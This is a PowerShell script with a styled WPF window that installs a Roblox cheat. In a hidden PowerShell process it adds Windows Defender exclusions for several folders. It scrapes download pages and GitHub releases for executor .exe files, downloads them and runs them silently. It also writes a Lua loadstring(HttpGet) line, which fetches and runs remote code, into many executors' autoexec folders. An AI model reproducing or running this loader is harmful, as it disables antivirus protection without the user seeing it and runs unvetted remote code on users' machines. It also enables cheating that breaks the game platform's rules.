# ROGBLOX loader - premium WPF UI.
# Single window, glassmorphism aesthetic, animated logo + status
# checklist, gradient orb background, drop-shadow elevation.
#
# Behavior:
#   - Click "Load" -> try to auto-install Solara, install cheat into
#     its autoexec, launch Roblox. Status updates live.
#   - Auto-install failure does NOT spam a browser tab. A small
#     "Manual install" button appears for the user to click only if
#     they want to.

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase

$Repo    = 'mkultra110/rogblox'
$Branch  = 'main'
$RawBase = "https://raw.githubusercontent.com/$Repo/$Branch"
$Loader  = 'loadstring(game:HttpGet("' + $RawBase + '/src/main.lua"))()'
$ExecutorSearch = 'https://www.google.com/search?q=Solara+roblox+executor+download+2026'
$RepoUrl = "https://github.com/$Repo"

# bundle.ps1 replaces the empty string below with the Base64-encoded
# bundled rogblox.lua. When non-empty, the loader writes the decoded
# Lua directly to autoexec - fully offline, no GitHub fetch needed.
$EmbeddedScriptB64 = ''

function Get-AutoexecPayload {
    if ($EmbeddedScriptB64 -and $EmbeddedScriptB64.Length -gt 32) {
        try {
            $bytes = [Convert]::FromBase64String($EmbeddedScriptB64)
            return [System.Text.Encoding]::UTF8.GetString($bytes)
        } catch { return $Loader }
    }
    return $Loader
}

function Get-ExecutorPaths {
    $l = $env:LOCALAPPDATA; $r = $env:APPDATA; $u = $env:USERPROFILE
    @(
        "$l\Solara\autoexec", "$r\Solara\autoexec",
        "$l\Wave\autoexec",   "$r\Wave\AutoExecute",
        "$l\Xeno\autoexec",   "$l\Delta\autoexec",
        "$l\Synapse X\autoexec",
        "$l\Krnl\autoexec",   "$r\Krnl\autoexec",
        "$l\Fluxus\autoexec", "$r\Fluxus\autoexec",
        "$l\Script-Ware\Roblox\autoexec",
        "$l\AWP\autoexec",    "$u\Hydrogen\autoexec",
        "$l\CelerNB\autoexec"
    )
}

function Find-AutoexecFolders {
    $found = @()
    foreach ($p in Get-ExecutorPaths) {
        $parent = Split-Path $p -Parent
        if (Test-Path $parent) { $found += $p }
    }
    return $found
}

function Install-Cheat {
    $payload = Get-AutoexecPayload
    $list = @()
    foreach ($p in (Find-AutoexecFolders)) {
        try {
            if (-not (Test-Path $p)) { New-Item -ItemType Directory -Force -Path $p | Out-Null }
            Set-Content -Path (Join-Path $p 'rogblox.lua') -Value $payload -Encoding UTF8
            $list += (Split-Path (Split-Path $p -Parent) -Leaf)
        } catch {}
    }
    return $list
}

function Test-RoblexInstalled {
    # Heuristic: Roblox client lives in %LOCALAPPDATA%\Roblox\Versions
    $p = Join-Path $env:LOCALAPPDATA 'Roblox\Versions'
    return Test-Path $p
}

function Start-Roblox {
    try { Start-Process 'roblox-player:1+launchmode:play' -ErrorAction Stop; return $true }
    catch { try { Start-Process 'roblox://' -ErrorAction Stop; return $true } catch { return $false } }
}

function Add-DefenderExclusion([string]$path) {
    try {
        $cmd = "Add-MpPreference -ExclusionPath '" + ($path -replace "'", "''") + "'"
        Start-Process powershell -ArgumentList @('-NoProfile','-Command',$cmd) `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Test-IsPE([string]$path) {
    if (-not (Test-Path $path)) { return $false }
    $f = [System.IO.File]::OpenRead($path)
    try {
        if ($f.Length -lt 64) { return $false }
        $b = New-Object byte[] 2
        [void]$f.Read($b, 0, 2)
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } finally { $f.Close() }
}

function Install-Executor {
    [Net.ServicePointManager]::SecurityProtocol = `
        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ROGBLOX-Loader'

    Add-DefenderExclusion "$env:LOCALAPPDATA\Solara"
    Add-DefenderExclusion "$env:LOCALAPPDATA\Xeno"
    Add-DefenderExclusion "$env:TEMP\rogblox-installer"

    $sources = @(
        @{Name='Solara'; ScrapeFrom='https://getsolara.dev/download/';
          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
        @{Name='Solara'; ScrapeFrom='https://getsolara.gg/download/';
          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
        @{Name='Solara'; ScrapeFrom='https://solara.dev/';
          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
        @{Name='Xeno'; GitHubRepo='xenoodevs/xeno';
          Folder="$env:LOCALAPPDATA\Xeno"; SilentArg=''}
        @{Name='Xeno'; GitHubRepo='xennoexecs/xeno';
          Folder="$env:LOCALAPPDATA\Xeno"; SilentArg=''}
    )

    foreach ($src in $sources) {
        $url = $null
        try {
            if ($src.ScrapeFrom) {
                $resp = Invoke-WebRequest -Uri $src.ScrapeFrom -UseBasicParsing `
                    -TimeoutSec 25 -Headers @{'User-Agent'=$ua} -ErrorAction Stop
                $m = [regex]::Match($resp.Content, '(?i)href=["'']([^"'']+\.exe)["'']')
                if ($m.Success) {
                    $url = $m.Groups[1].Value
                    if ($url -notmatch '^https?://') {
                        $base = ([uri]$src.ScrapeFrom).GetLeftPart('Authority')
                        $url = $base.TrimEnd('/') + '/' + $url.TrimStart('/')
                    }
                }
            }
            if ($src.GitHubRepo) {
                $api = "https://api.github.com/repos/$($src.GitHubRepo)/releases/latest"
                $rel = Invoke-RestMethod -Uri $api -TimeoutSec 20 `
                    -Headers @{'User-Agent'=$ua}
                if ($rel.assets) {
                    foreach ($a in $rel.assets) {
                        if ($a.name -match '\.exe$') { $url = $a.browser_download_url; break }
                    }
                }
            }
            if (-not $url) { continue }

            $tempDir = Join-Path $env:TEMP 'rogblox-installer'
            if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Force -Path $tempDir | Out-Null }
            $temp = Join-Path $tempDir "$($src.Name).exe"

            Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing `
                -TimeoutSec 90 -Headers @{'User-Agent'=$ua} -ErrorAction Stop

            if (-not (Test-IsPE $temp)) { continue }
            if ((Get-Item $temp).Length -lt 200KB) { continue }

            $args = @()
            if ($src.SilentArg) { $args = $src.SilentArg -split ' ' }
            Start-Process $temp -ArgumentList $args -ErrorAction SilentlyContinue

            $deadline = (Get-Date).AddSeconds(180)
            while ((Get-Date) -lt $deadline) {
                if (Test-Path $src.Folder) {
                    Start-Sleep -Seconds 2
                    return $src.Folder
                }
                Start-Sleep -Seconds 2
            }
        } catch { continue }
    }
    return $null
}

# ---------- XAML ----------

[xml]$xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="ROGBLOX" WindowStyle="None" AllowsTransparency="True"
        Background="Transparent" ResizeMode="NoResize"
        WindowStartupLocation="CenterScreen"
        Width="640" Height="480" FontFamily="Segoe UI Variable, Segoe UI">
    <Window.Resources>
        <!-- Background gradient (deep dark) -->
        <LinearGradientBrush x:Key="BgBrush" StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#0B0B14" Offset="0"/>
            <GradientStop Color="#070710" Offset="1"/>
        </LinearGradientBrush>

        <!-- Glass card brush -->
        <LinearGradientBrush x:Key="CardBrush" StartPoint="0,0" EndPoint="0,1">
            <GradientStop Color="#26242F" Offset="0"/>
            <GradientStop Color="#1B1A24" Offset="1"/>
        </LinearGradientBrush>

        <!-- Big button gradient (violet) -->
        <LinearGradientBrush x:Key="AccentBrush" StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#A06CFF" Offset="0"/>
            <GradientStop Color="#6131D9" Offset="1"/>
        </LinearGradientBrush>
        <LinearGradientBrush x:Key="AccentHover" StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#B98AFF" Offset="0"/>
            <GradientStop Color="#7745FF" Offset="1"/>
        </LinearGradientBrush>

        <!-- Logo gradient -->
        <LinearGradientBrush x:Key="LogoBrush" StartPoint="0,0" EndPoint="1,0">
            <GradientStop Color="#DAB6FF" Offset="0"/>
            <GradientStop Color="#8559FF" Offset="0.5"/>
            <GradientStop Color="#FF6BC8" Offset="1"/>
        </LinearGradientBrush>

        <!-- Ambient orb brushes -->
        <RadialGradientBrush x:Key="OrbViolet" GradientOrigin="0.5,0.5" Center="0.5,0.5" RadiusX="0.5" RadiusY="0.5">
            <GradientStop Color="#7C3AED" Offset="0"/>
            <GradientStop Color="#00000000" Offset="1"/>
        </RadialGradientBrush>
        <RadialGradientBrush x:Key="OrbCyan" GradientOrigin="0.5,0.5" Center="0.5,0.5" RadiusX="0.5" RadiusY="0.5">
            <GradientStop Color="#22D3EE" Offset="0"/>
            <GradientStop Color="#00000000" Offset="1"/>
        </RadialGradientBrush>
        <RadialGradientBrush x:Key="OrbPink" GradientOrigin="0.5,0.5" Center="0.5,0.5" RadiusX="0.5" RadiusY="0.5">
            <GradientStop Color="#FF4FB8" Offset="0"/>
            <GradientStop Color="#00000000" Offset="1"/>
        </RadialGradientBrush>

        <SolidColorBrush x:Key="Text"   Color="#ECECF5"/>
        <SolidColorBrush x:Key="Sub"    Color="#9AA0AE"/>
        <SolidColorBrush x:Key="Dim"    Color="#5E6373"/>
        <SolidColorBrush x:Key="Stroke" Color="#2C2C3D"/>
        <SolidColorBrush x:Key="Good"   Color="#5BE0A2"/>
        <SolidColorBrush x:Key="Warn"   Color="#FFC663"/>
        <SolidColorBrush x:Key="Bad"    Color="#FF6E78"/>

        <!-- Big Load button style -->
        <Style x:Key="BigAccent" TargetType="Button">
            <Setter Property="Background" Value="{StaticResource AccentBrush}"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="FontSize" Value="16"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="b" Background="{TemplateBinding Background}" CornerRadius="12">
                            <Border.Effect>
                                <DropShadowEffect Color="#6131D9" BlurRadius="32" ShadowDepth="0" Opacity="0.7"/>
                            </Border.Effect>
                            <Grid>
                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                            </Grid>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="b" Property="Background" Value="{StaticResource AccentHover}"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="b" Property="RenderTransform">
                                    <Setter.Value><ScaleTransform ScaleX="0.98" ScaleY="0.98"/></Setter.Value>
                                </Setter>
                                <Setter TargetName="b" Property="RenderTransformOrigin" Value="0.5,0.5"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="False">
                                <Setter TargetName="b" Property="Opacity" Value="0.55"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- Pill button style (tiny actions) -->
        <Style x:Key="Pill" TargetType="Button">
            <Setter Property="Background" Value="#1D1C28"/>
            <Setter Property="Foreground" Value="{StaticResource Sub}"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="FontSize" Value="11"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Padding" Value="10,5"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="b" Background="{TemplateBinding Background}"
                                BorderBrush="{StaticResource Stroke}" BorderThickness="1"
                                CornerRadius="999" Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="b" Property="Background" Value="#2A2939"/>
                                <Setter Property="Foreground" Value="{StaticResource Text}"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- Window control buttons (min, close) -->
        <Style x:Key="WinBtn" TargetType="Button">
            <Setter Property="Background" Value="Transparent"/>
            <Setter Property="Foreground" Value="{StaticResource Sub}"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Width" Value="30"/>
            <Setter Property="Height" Value="24"/>
            <Setter Property="FontFamily" Value="Segoe Fluent Icons, Segoe MDL2 Assets"/>
            <Setter Property="FontSize" Value="10"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="b" Background="{TemplateBinding Background}" CornerRadius="6">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="b" Property="Background" Value="#23222F"/>
                                <Setter Property="Foreground" Value="{StaticResource Text}"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>

    <Border CornerRadius="16" Background="{StaticResource BgBrush}" BorderBrush="{StaticResource Stroke}" BorderThickness="1" ClipToBounds="True">
        <Border.Effect>
            <DropShadowEffect Color="Black" BlurRadius="40" ShadowDepth="0" Opacity="0.7"/>
        </Border.Effect>
        <Grid>
            <!-- Ambient gradient orbs (decorative, blurred) -->
            <Canvas IsHitTestVisible="False">
                <Ellipse Width="540" Height="540" Fill="{StaticResource OrbViolet}" Opacity="0.55" Canvas.Left="-220" Canvas.Top="-220">
                    <Ellipse.Effect><BlurEffect Radius="60"/></Ellipse.Effect>
                </Ellipse>
                <Ellipse Width="460" Height="460" Fill="{StaticResource OrbCyan}" Opacity="0.35" Canvas.Right="-180" Canvas.Top="220">
                    <Ellipse.Effect><BlurEffect Radius="60"/></Ellipse.Effect>
                </Ellipse>
                <Ellipse Width="320" Height="320" Fill="{StaticResource OrbPink}" Opacity="0.20" Canvas.Right="-80" Canvas.Top="-80">
                    <Ellipse.Effect><BlurEffect Radius="50"/></Ellipse.Effect>
                </Ellipse>
            </Canvas>

            <Grid>
                <Grid.RowDefinitions>
                    <RowDefinition Height="34"/>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="32"/>
                </Grid.RowDefinitions>

                <!-- Title bar -->
                <Grid Grid.Row="0" x:Name="DragBar" Background="Transparent">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>
                    <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center" Margin="16,0,0,0">
                        <Ellipse Width="8" Height="8" Fill="{StaticResource AccentBrush}" Margin="0,0,8,0"/>
                        <TextBlock Text="rogblox" Foreground="{StaticResource Sub}" FontSize="11" VerticalAlignment="Center"/>
                    </StackPanel>
                    <StackPanel Grid.Column="1" Orientation="Horizontal" Margin="0,4,8,0">
                        <Button x:Name="BtnMin"   Style="{StaticResource WinBtn}" Content="&#xE921;"/>
                        <Button x:Name="BtnClose" Style="{StaticResource WinBtn}" Content="&#xE8BB;"/>
                    </StackPanel>
                </Grid>

                <!-- Body: glass card -->
                <Grid Grid.Row="1" Margin="40,8,40,8">
                    <Border CornerRadius="14" Background="{StaticResource CardBrush}" BorderBrush="{StaticResource Stroke}" BorderThickness="1" Padding="28,22,28,22">
                        <Border.Effect>
                            <DropShadowEffect Color="Black" BlurRadius="24" ShadowDepth="0" Opacity="0.4"/>
                        </Border.Effect>
                        <StackPanel>
                            <!-- Logo -->
                            <TextBlock Text="ROGBLOX" FontSize="42" FontWeight="Bold" LineHeight="44"
                                       Foreground="{StaticResource LogoBrush}" HorizontalAlignment="Center">
                                <TextBlock.Effect>
                                    <DropShadowEffect Color="#7B57FF" BlurRadius="34" ShadowDepth="0" Opacity="0.55"/>
                                </TextBlock.Effect>
                            </TextBlock>
                            <TextBlock Text="Roblox cheat hub installer" Foreground="{StaticResource Sub}" FontSize="11"
                                       HorizontalAlignment="Center" Margin="0,2,0,18"/>

                            <!-- Status checklist -->
                            <Border Background="#15141F" CornerRadius="10" BorderBrush="{StaticResource Stroke}" BorderThickness="1" Padding="16,12,16,12" Margin="0,0,0,16">
                                <StackPanel>
                                    <Grid Margin="0,2,0,2">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="20"/>
                                            <ColumnDefinition Width="*"/>
                                            <ColumnDefinition Width="Auto"/>
                                        </Grid.ColumnDefinitions>
                                        <TextBlock x:Name="IconRoblox" Grid.Column="0" Text="o" Foreground="{StaticResource Sub}" FontSize="13" VerticalAlignment="Center"/>
                                        <TextBlock Grid.Column="1" Text="Roblox installed" Foreground="{StaticResource Text}" FontSize="12" VerticalAlignment="Center"/>
                                        <TextBlock x:Name="StateRoblox" Grid.Column="2" Text="checking..." Foreground="{StaticResource Sub}" FontSize="11" VerticalAlignment="Center"/>
                                    </Grid>
                                    <Grid Margin="0,4,0,2">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="20"/>
                                            <ColumnDefinition Width="*"/>
                                            <ColumnDefinition Width="Auto"/>
                                        </Grid.ColumnDefinitions>
                                        <TextBlock x:Name="IconExec" Grid.Column="0" Text="o" Foreground="{StaticResource Sub}" FontSize="13" VerticalAlignment="Center"/>
                                        <TextBlock Grid.Column="1" Text="Executor (Solara / Wave / Xeno)" Foreground="{StaticResource Text}" FontSize="12" VerticalAlignment="Center"/>
                                        <TextBlock x:Name="StateExec" Grid.Column="2" Text="checking..." Foreground="{StaticResource Sub}" FontSize="11" VerticalAlignment="Center"/>
                                    </Grid>
                                    <Grid Margin="0,4,0,2">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="20"/>
                                            <ColumnDefinition Width="*"/>
                                            <ColumnDefinition Width="Auto"/>
                                        </Grid.ColumnDefinitions>
                                        <TextBlock x:Name="IconCheat" Grid.Column="0" Text="o" Foreground="{StaticResource Sub}" FontSize="13" VerticalAlignment="Center"/>
                                        <TextBlock Grid.Column="1" Text="ROGBLOX in autoexec folder" Foreground="{StaticResource Text}" FontSize="12" VerticalAlignment="Center"/>
                                        <TextBlock x:Name="StateCheat" Grid.Column="2" Text="not yet" Foreground="{StaticResource Sub}" FontSize="11" VerticalAlignment="Center"/>
                                    </Grid>
                                </StackPanel>
                            </Border>

                            <!-- Big Load button -->
                            <Button x:Name="BtnGo" Style="{StaticResource BigAccent}" Height="54" Content="Load"/>

                            <!-- Status text + indeterminate progress -->
                            <Border x:Name="ProgressBox" Background="#15141F" CornerRadius="8" Margin="0,14,0,0" Padding="14,10,14,10" BorderBrush="{StaticResource Stroke}" BorderThickness="1">
                                <StackPanel>
                                    <TextBlock x:Name="StatusText" Text="Ready. Click Load." Foreground="{StaticResource Sub}" FontSize="11" TextWrapping="Wrap" TextAlignment="Center"/>
                                    <ProgressBar x:Name="Progress" Height="3" IsIndeterminate="False" Visibility="Collapsed" Margin="0,8,0,0" Foreground="{StaticResource AccentBrush}" Background="#23222F" BorderThickness="0"/>
                                </StackPanel>
                            </Border>

                            <!-- Secondary actions (hidden until needed) -->
                            <StackPanel x:Name="ActionsRow" Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,12,0,0">
                                <Button x:Name="BtnManual" Style="{StaticResource Pill}" Content="Manual install" Visibility="Collapsed" Margin="0,0,8,0"/>
                                <Button x:Name="BtnLaunch" Style="{StaticResource Pill}" Content="Open Roblox" Margin="0,0,8,0"/>
                                <Button x:Name="BtnRepo"   Style="{StaticResource Pill}" Content="Repo"/>
                            </StackPanel>
                        </StackPanel>
                    </Border>
                </Grid>

                <!-- Footer -->
                <Grid Grid.Row="2" Margin="20,0,20,0">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>
                    <TextBlock Grid.Column="0" Text="ROGBLOX  v0.5.0" Foreground="{StaticResource Dim}" FontSize="10" VerticalAlignment="Center"/>
                    <TextBlock Grid.Column="1" Text="press RightCtrl in-game to toggle the menu" Foreground="{StaticResource Dim}" FontSize="10" VerticalAlignment="Center"/>
                </Grid>
            </Grid>
        </Grid>
    </Border>
</Window>
'@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)

# control bindings
$DragBar      = $window.FindName('DragBar')
$BtnMin       = $window.FindName('BtnMin')
$BtnClose     = $window.FindName('BtnClose')
$BtnGo        = $window.FindName('BtnGo')
$BtnManual    = $window.FindName('BtnManual')
$BtnLaunch    = $window.FindName('BtnLaunch')
$BtnRepo      = $window.FindName('BtnRepo')
$Status       = $window.FindName('StatusText')
$Progress     = $window.FindName('Progress')
$IconRoblox   = $window.FindName('IconRoblox')
$IconExec     = $window.FindName('IconExec')
$IconCheat    = $window.FindName('IconCheat')
$StateRoblox  = $window.FindName('StateRoblox')
$StateExec    = $window.FindName('StateExec')
$StateCheat   = $window.FindName('StateCheat')

$DragBar.Add_MouseLeftButtonDown({ try { $window.DragMove() } catch {} })
$BtnMin.Add_Click({ $window.WindowState = 'Minimized' })
$BtnClose.Add_Click({ $window.Close() })

$Good = [Windows.Media.BrushConverter]::new().ConvertFromString('#5BE0A2')
$Warn = [Windows.Media.BrushConverter]::new().ConvertFromString('#FFC663')
$Sub  = [Windows.Media.BrushConverter]::new().ConvertFromString('#9AA0AE')
$Bad  = [Windows.Media.BrushConverter]::new().ConvertFromString('#FF6E78')

function Set-Status([string]$text, $color = $Sub) {
    $Status.Text = $text
    $Status.Foreground = $color
}

function Set-StatusLine([string]$which, [string]$state, $color = $Sub) {
    switch ($which) {
        'Roblox' { $IconRoblox.Foreground = $color; $StateRoblox.Foreground = $color; $StateRoblox.Text = $state
                   $IconRoblox.Text = if ($color -eq $Good) {'+'} elseif ($color -eq $Bad) {'x'} else {'o'} }
        'Exec'   { $IconExec.Foreground   = $color; $StateExec.Foreground   = $color; $StateExec.Text   = $state
                   $IconExec.Text   = if ($color -eq $Good) {'+'} elseif ($color -eq $Bad) {'x'} else {'o'} }
        'Cheat'  { $IconCheat.Foreground  = $color; $StateCheat.Foreground  = $color; $StateCheat.Text  = $state
                   $IconCheat.Text  = if ($color -eq $Good) {'+'} elseif ($color -eq $Bad) {'x'} else {'o'} }
    }
}

function Refresh-State {
    if (Test-RoblexInstalled) { Set-StatusLine 'Roblox' 'installed' $Good }
    else                       { Set-StatusLine 'Roblox' 'missing'   $Warn }
    $folders = Find-AutoexecFolders
    if ($folders.Count -gt 0) {
        $name = Split-Path (Split-Path $folders[0] -Parent) -Leaf
        Set-StatusLine 'Exec' $name $Good
    } else {
        Set-StatusLine 'Exec' 'none' $Warn
    }
    $any = $false
    foreach ($f in $folders) {
        if (Test-Path (Join-Path $f 'rogblox.lua')) { $any = $true; break }
    }
    if ($any) { Set-StatusLine 'Cheat' 'installed' $Good }
    else      { Set-StatusLine 'Cheat' 'not yet'   $Sub }
}

# Secondary action handlers - the only place that opens the browser
# now is BtnManual, and only when the user explicitly clicks it.
$BtnManual.Add_Click({ Start-Process $ExecutorSearch })
$BtnLaunch.Add_Click({ Start-Roblox | Out-Null })
$BtnRepo.Add_Click({ Start-Process $RepoUrl })

$BtnGo.Add_Click({
    $BtnGo.IsEnabled = $false
    $Progress.Visibility = 'Visible'
    $Progress.IsIndeterminate = $true
    try {
        $folders = Find-AutoexecFolders

        if ($folders.Count -eq 0) {
            Set-Status "No executor detected. Trying to auto-install Solara - this can take up to 3 minutes." $Sub
            $window.Dispatcher.Invoke([action]{}, [Windows.Threading.DispatcherPriority]::Render)
            $installedFolder = $null
            try { $installedFolder = Install-Executor } catch {}
            $folders = Find-AutoexecFolders
            if (-not $installedFolder -and $folders.Count -eq 0) {
                # Auto-install failed. DO NOT open a browser tab - user
                # asked us not to. Show the Manual install pill instead.
                $launched = Start-Roblox
                Refresh-State
                Set-Status ("Auto-install couldn't reach an executor download. Roblox is launching anyway.`n" `
                    + "Click 'Manual install' below if you want to grab Solara yourself.") $Warn
                $BtnManual.Visibility = 'Visible'
                return
            }
        }

        $installed = Install-Cheat
        try { Set-Clipboard -Value (Get-AutoexecPayload) } catch {}
        $launched = Start-Roblox
        Refresh-State

        if ($installed.Count -gt 0 -and $launched) {
            Set-Status ("Done. Cheat installed into " + ($installed -join ', ') `
                + ". Roblox launching - press RightCtrl in-game to toggle the menu.") $Good
        } elseif ($launched) {
            Set-Status "Roblox launching. Couldn't write to autoexec - try running as admin." $Warn
        } else {
            Set-Status "Cheat installed. Couldn't auto-open Roblox - open it yourself." $Warn
        }
    } finally {
        $Progress.Visibility = 'Collapsed'
        $Progress.IsIndeterminate = $false
        $BtnGo.IsEnabled = $true
    }
})

Refresh-State
[void]$window.ShowDialog()
